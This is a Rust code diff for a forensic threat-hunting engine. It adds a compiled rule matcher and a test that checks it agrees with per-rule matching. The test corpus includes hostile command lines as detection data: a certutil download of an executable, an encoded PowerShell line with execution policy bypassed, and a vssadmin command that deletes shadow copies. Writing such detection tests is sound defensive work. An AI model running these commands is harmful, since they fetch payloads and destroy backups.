@@ -118,9 +118,9 @@ pub fn run(store: &CaseStore, rules: &RuleSet) -> HuntReport {
     let mut errors = rules.load_errors.clone();
 
     // ── Single-event engine ────────────────────────────────────────────────
-    // One streamed pass over events; every rule is offered each event. Rule
-    // counts are small (tens–hundreds), so per-event iteration is fine and
-    // avoids one SQL scan per rule.
+    // One streamed pass over events. Rules are pre-compiled into one combined
+    // matcher per event field (see `CompiledRules`), so a pack of hundreds of
+    // rules costs about the same per event as a pack of tens.
     let ev_rules = &rules.event_rules;
     if !ev_rules.is_empty() {
         // Parse `raw` per row only if some loaded rule reads a raw-backed field
@@ -135,9 +135,16 @@ pub fn run(store: &CaseStore, rules: &RuleSet) -> HuntReport {
         // genuinely distinct entries (e.g. several values under one Run key).
         let mut mft_seen: std::collections::HashMap<(String, Uuid, String), usize> =
             std::collections::HashMap::new();
+        // Compile once: every field's conditions become one combined matcher,
+        // so per-event cost barely grows with the number of rules.
+        let compiled = crate::event_rule::CompiledRules::new(ev_rules);
+        let mut hit_buf: Vec<bool> = Vec::new();
+        let mut matched: Vec<usize> = Vec::new();
         let scan = store.for_each_event(needs_raw, |ev| {
-            for rule in ev_rules {
-                if rule.matches(ev) {
+            compiled.matching(ev, &mut hit_buf, &mut matched);
+            for &ri in &matched {
+                let rule = &ev_rules[ri];
+                {
                     if ev.artefact == fx_core::ArtefactKind::Mft {
                         if let Some(sref) = &ev.provenance.source_ref {
                             let key = (rule.id.clone(), ev.provenance.evidence_id, sref.clone());
@@ -299,6 +306,77 @@ mod embedded_rules_tests {
             super::EMBEDDED_RULES.iter().map(|(n, _)| n.to_string()).collect();
         embedded.sort();
         assert_eq!(on_disk, embedded, "rules/ and EMBEDDED_RULES differ");
+    }
+
+    /// Every embedded rule's self-tests pass — through BOTH the per-rule path
+    /// and the compiled (combined-matcher) path, which must always agree.
+    #[test]
+    fn embedded_rule_examples_and_engine_equivalence() {
+        use crate::event_rule::{event_from_example, CompiledRules};
+        let rs = super::RuleSet::from_embedded();
+        let rules = &rs.event_rules;
+        let compiled = CompiledRules::new(rules);
+        let (mut hit, mut out) = (Vec::new(), Vec::new());
+        let mut failures = Vec::new();
+        let mut examples = 0;
+        for (ri, r) in rules.iter().enumerate() {
+            for (want, set) in [(true, &r.tests.should_match), (false, &r.tests.no_match)] {
+                for ex in set {
+                    examples += 1;
+                    let ev = event_from_example(ex);
+                    let old = r.matches(&ev);
+                    compiled.matching(&ev, &mut hit, &mut out);
+                    let new = out.contains(&ri);
+                    if old != new {
+                        failures.push(format!("{}: engines disagree on {:?}", r.id, ex));
+                    } else if old != want {
+                        failures.push(format!("{}: expected {} on {:?}", r.id, if want { "match" } else { "no match" }, ex));
+                    }
+                }
+            }
+        }
+        // Synthetic cross-traffic: every literal value from every rule, plus
+        // typical benign strings, placed in each commonly-used field.
+        let mut corpus: Vec<String> = vec![
+            r"C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule".into(),
+            r"powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgA".into(),
+            r"C:\PerfLogs\a.exe".into(), r"certutil -urlcache -f http://x/y.exe y.exe".into(),
+            r"vssadmin delete shadows /all /quiet".into(), "process.start".into(), "".into(),
+        ];
+        fn lits(c: &crate::event_rule::Condition, out: &mut Vec<String>) {
+            use crate::event_rule::Condition::*;
+            match c { All { all } => all.iter().for_each(|x| lits(x, out)), Any { any } => any.iter().for_each(|x| lits(x, out)),
+                      Not { not } => lits(not, out), Match { match_ } => out.extend(match_.values.iter().cloned()) }
+        }
+        for r in rules { lits(&r.detection, &mut corpus); }
+        for v in &corpus {
+            for field in ["process.command_line", "process.name", "process.path", "target.path", "message", "action", "process.parent_name"] {
+                for art in ["evtx", "mft", "prefetch"] {
+                    let mut ex = std::collections::BTreeMap::new();
+                    ex.insert(field.to_string(), v.clone());
+                    ex.insert("artefact".to_string(), art.to_string());
+                    let ev = event_from_example(&ex);
+                    compiled.matching(&ev, &mut hit, &mut out);
+                    for (ri, r2) in rules.iter().enumerate() {
+                        if r2.matches(&ev) != out.contains(&ri) {
+                            failures.push(format!("{}: engines disagree on {field}={v:?} ({art})", r2.id));
+                        }
+                    }
+                }
+            }
+        }
+        for r in rules {
+            for ex in r.tests.should_match.iter().chain(r.tests.no_match.iter()) {
+                let ev = event_from_example(ex);
+                compiled.matching(&ev, &mut hit, &mut out);
+                for (ri, r2) in rules.iter().enumerate() {
+                    if r2.matches(&ev) != out.contains(&ri) {
+                        failures.push(format!("{} vs example of {}: engines disagree", r2.id, r.id));
+                    }
+                }
+            }
+        }
+        assert!(failures.is_empty(), "{} of {} examples failed:\n{}", failures.len(), examples, failures.join("\n"));
     }
 
     /// Every embedded rule must parse.
